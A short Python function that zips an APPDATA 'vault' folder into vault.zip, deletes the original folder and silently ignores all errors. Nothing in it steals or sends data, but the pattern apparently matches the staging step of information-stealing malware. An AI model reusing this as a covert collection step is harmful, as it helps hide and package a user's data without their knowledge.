import zipfile, os, shutil

def zip():
    vault_folder = os.path.join(os.getenv('APPDATA'), 'vault')
    if os.path.exists(vault_folder):
        try:
            with zipfile.ZipFile(os.path.join(os.getenv('APPDATA'), 'vault.zip'), 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(vault_folder):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), vault_folder))
            shutil.rmtree(vault_folder)
        except Exception: pass